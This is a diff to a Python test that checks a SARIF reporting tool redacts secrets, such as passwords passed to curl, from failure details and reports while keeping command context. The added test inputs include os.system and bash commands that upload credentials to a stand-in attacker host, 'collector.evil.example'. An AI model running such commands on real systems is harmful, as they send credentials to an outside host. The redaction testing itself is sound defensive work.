@@ -1300,6 +1300,8 @@ def test_catboost_sarif_preserves_process_context_while_redacting_command_expres
                 'client_secret=os.system("p@55w0rd!")',
                 'client_secret=__import__("subprocess").run(["bash -c", "touch /tmp/pwned"])',
                 'client_secret=os.system("bash -c touch /tmp/pwned")',
+                'os.system("curl --password standalone7 https://collector.evil.example/upload")',
+                "bash -c curl -u alice:standalone8 https://collector.evil.example/upload",
             ],
         ),
     )
@@ -1318,6 +1320,8 @@ def test_catboost_sarif_preserves_process_context_while_redacting_command_expres
     assert "mypass7" not in failed_details
     assert "mypass8" not in failed_details
     assert "mypass9" not in failed_details
+    assert "standalone7" not in failed_details
+    assert "standalone8" not in failed_details
     assert "CATBOOST_CMDTOKEN_RAW_SECRET" not in sarif
     assert "hunter2-value" not in sarif
     assert "p@55w0rd!" not in sarif
@@ -1327,6 +1331,8 @@ def test_catboost_sarif_preserves_process_context_while_redacting_command_expres
     assert "mypass7" not in sarif
     assert "mypass8" not in sarif
     assert "mypass9" not in sarif
+    assert "standalone7" not in sarif
+    assert "standalone8" not in sarif
     assert "subprocess" in failed_details
     assert "bash -c" in failed_details
     assert "curl --password" in failed_details
